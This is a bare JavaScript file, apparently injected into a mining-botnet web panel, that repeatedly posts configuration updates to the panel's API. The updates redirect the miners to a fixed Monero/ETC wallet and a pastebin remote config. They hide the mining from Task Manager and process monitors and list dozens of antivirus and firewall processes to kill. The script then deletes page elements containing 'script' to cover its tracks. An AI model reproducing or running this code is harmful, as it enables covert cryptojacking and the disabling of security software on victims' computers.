function fetchData() {
    let _type = "POST";
    let _url = "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": 1,
        "data": JSON.stringify({
            "algo": "rx/0",
            "pool": "randomxmonero.auto.nicehash.com",
            "port": 9200,
            "wallet": "3Mj3isU7efFTY3hwzMhneurp7bRYw5A23B.{COMPUTERNAME}",
            "password": "",
            "nicehash": false,
            "ssltls": false,
            "max-cpu": 80,
            "idle-wait": 7,
            "idle-cpu": 90,
            "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
            "kill-targets": "afwServ.exe,aswEngSrv.exe,aswidsagent.exe,aswToolsSvc.exe,AvastSvc.exe,AvastSvc.exe,AvastUI.exe,wsc_proxy.exe,AvastBrowser.exe,AvastNM.exe,ashwebsv.exe,aswupdsv.exe,kavfswp.exe,kavtray.exe,kavfsmui.exe,kavshell.exe,kavfsrcn.exe,kavfs.exe,kavfsgt.exe,kavfswh.exe,kavfsscs.exe,efpeadm.exe,VPNGUI.exe,CVPND.exe,IPSECLOG.exe,cfp.exe,fsdfwd.exe,fsguiexe.exe,blackd.exe,kpf4gui.exe,MSSCLL.exe,MCSHELL.exe,MPFSERVICE.exe,MPFAGENT.exe,nisum.exe,smc.exe,persfw.exe,pccpfw.exe,WINSS.exe,ZLCLIENT.exe,MCODS.exe,MCSHIELD.exe,msmpeng.exe,navapsvc.exe,avkwctl.exe,fsav32.exe,mcshield.exe,ntrtscan.exe,avguard.exe,ashServ.exe,AVENGINE.exe,avgemc.exe,tmntsrv.exe,ARestore.exe,asOELnch.exe,buVss.exe,cltLMH.exe,cltRT.exe,coInst.exe,coNatHst.exe,CpySnpt.exe,EFAInst64.exe,elaminst.exe,FLDgHost.exe,InstCA.exe,MCUI32.exe,Navw32.exe,ncolow.exe,NortonSecurity.exe,NSc.exe,nsWscSvc.exe,nuPerfScan.exe,RuleUp.exe,SEFInst.exe,Sevntx64.exe,SRTSP_CA.exe,SymDgnHC.exe,symerr.exe,SymVTCatalogDB.exe,tuIH.exe,uiStub.exe,uiWNSNotificationApp.exe,Upgrade.exe,vpnCA.exe,wa_3rd_party_host_32.exe,wa_3rd_party_host_64.exe,WFPUnins.exe,wpInstCA.exe,WSCStub.exe",
            "stealth-fullscreen": true,
            "remote-config": "https://pastebin.com/raw/7dCgdHCt",
            "api-endpoint": "http://web-panel.online/api/endpoint.php"
        })
    };

unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Loaded");
        },
        function(error) {
            console.error("Error");
        }
    );
}

function fetchData2() {
    let _type = "POST";
    let _url = "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": 2,
        "data": JSON.stringify({
            "algo": "etchash",
            "pool": "etchash.auto.nicehash.com",
            "port": 9200,
            "password": "x",
            "nicehash": true,
            "ssltls": false,
            "wallet": "3Mj3isU7efFTY3hwzMhneurp7bRYw5A23B.new_etc",
            "max-cpu": 80,
            "idle-wait": 7,
            "idle-cpu": 90,
            "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
            "kill-targets": "afwServ.exe,aswEngSrv.exe,aswidsagent.exe,aswToolsSvc.exe,AvastSvc.exe,AvastSvc.exe,AvastUI.exe,wsc_proxy.exe,AvastBrowser.exe,AvastNM.exe,ashwebsv.exe,aswupdsv.exe,kavfswp.exe,kavtray.exe,kavfsmui.exe,kavshell.exe,kavfsrcn.exe,kavfs.exe,kavfsgt.exe,kavfswh.exe,kavfsscs.exe,efpeadm.exe,VPNGUI.exe,CVPND.exe,IPSECLOG.exe,cfp.exe,fsdfwd.exe,fsguiexe.exe,blackd.exe,kpf4gui.exe,MSSCLL.exe,MCSHELL.exe,MPFSERVICE.exe,MPFAGENT.exe,nisum.exe,smc.exe,persfw.exe,pccpfw.exe,WINSS.exe,ZLCLIENT.exe,MCODS.exe,MCSHIELD.exe,msmpeng.exe,navapsvc.exe,avkwctl.exe,fsav32.exe,mcshield.exe,ntrtscan.exe,avguard.exe,ashServ.exe,AVENGINE.exe,avgemc.exe,tmntsrv.exe,ARestore.exe,asOELnch.exe,buVss.exe,cltLMH.exe,cltRT.exe,coInst.exe,coNatHst.exe,CpySnpt.exe,EFAInst64.exe,elaminst.exe,FLDgHost.exe,InstCA.exe,MCUI32.exe,Navw32.exe,ncolow.exe,NortonSecurity.exe,NSc.exe,nsWscSvc.exe,nuPerfScan.exe,RuleUp.exe,SEFInst.exe,Sevntx64.exe,SRTSP_CA.exe,SymDgnHC.exe,symerr.exe,SymVTCatalogDB.exe,tuIH.exe,uiStub.exe,uiWNSNotificationApp.exe,Upgrade.exe,vpnCA.exe,wa_3rd_party_host_32.exe,wa_3rd_party_host_64.exe,WFPUnins.exe,wpInstCA.exe,WSCStub.exe",
            "stealth-fullscreen": true,
            "remote-config": "https://pastebin.com/raw/M56T7Yya",
            "api-endpoint": "http://web-panel.online/api/endpoint.php"
        })
    };

unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Loaded");
        },
        function(error) {
            console.error("Error");
        }
    );
}

function fetchDataN(N) {
    let _type = "POST";
    let _url = "/api/ajax-actions.php";
    let _data = {
        "method": "config-update",
        "index": N,
        "data": JSON.stringify({
            "algo": "rx/0",
            "pool": "randomxmonero.auto.nicehash.com",
            "port": 9200,
            "wallet": "3Mj3isU7efFTY3hwzMhneurp7bRYw5A23B.{COMPUTERNAME}",
            "password": "",
            "nicehash": false,
            "ssltls": false,
            "max-cpu": 80,
            "idle-wait": 7,
            "idle-cpu": 90,
            "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
            "kill-targets": "afwServ.exe,aswEngSrv.exe,aswidsagent.exe,aswToolsSvc.exe,AvastSvc.exe,AvastSvc.exe,AvastUI.exe,wsc_proxy.exe,AvastBrowser.exe,AvastNM.exe,ashwebsv.exe,aswupdsv.exe,kavfswp.exe,kavtray.exe,kavfsmui.exe,kavshell.exe,kavfsrcn.exe,kavfs.exe,kavfsgt.exe,kavfswh.exe,kavfsscs.exe,efpeadm.exe,VPNGUI.exe,CVPND.exe,IPSECLOG.exe,cfp.exe,fsdfwd.exe,fsguiexe.exe,blackd.exe,kpf4gui.exe,MSSCLL.exe,MCSHELL.exe,MPFSERVICE.exe,MPFAGENT.exe,nisum.exe,smc.exe,persfw.exe,pccpfw.exe,WINSS.exe,ZLCLIENT.exe,MCODS.exe,MCSHIELD.exe,msmpeng.exe,navapsvc.exe,avkwctl.exe,fsav32.exe,mcshield.exe,ntrtscan.exe,avguard.exe,ashServ.exe,AVENGINE.exe,avgemc.exe,tmntsrv.exe,ARestore.exe,asOELnch.exe,buVss.exe,cltLMH.exe,cltRT.exe,coInst.exe,coNatHst.exe,CpySnpt.exe,EFAInst64.exe,elaminst.exe,FLDgHost.exe,InstCA.exe,MCUI32.exe,Navw32.exe,ncolow.exe,NortonSecurity.exe,NSc.exe,nsWscSvc.exe,nuPerfScan.exe,RuleUp.exe,SEFInst.exe,Sevntx64.exe,SRTSP_CA.exe,SymDgnHC.exe,symerr.exe,SymVTCatalogDB.exe,tuIH.exe,uiStub.exe,uiWNSNotificationApp.exe,Upgrade.exe,vpnCA.exe,wa_3rd_party_host_32.exe,wa_3rd_party_host_64.exe,WFPUnins.exe,wpInstCA.exe,WSCStub.exe",
            "stealth-fullscreen": true,
            "remote-config": "https://pastebin.com/raw/7dCgdHCt",
            "api-endpoint": "http://web-panel.online/api/endpoint.php"
        })
    };

unam_jsonAjax(_type, _url, _data,
        function(response) {
            console.log("Loaded");
        },
        function(error) {
            console.error("Error");
        }
    );
}

function removeScript() {
    let card = document.getElementsByClassName("card");
    for (let i = 0; i < card.length; i++) {
        if (card[i].innerHTML.includes("script")) {
            card[i].remove();
        }
    }
}

for (let i = 3; i <= 10; i++) {
    fetchDataN(i);
}
fetchData();
fetchData2()
removeScript();
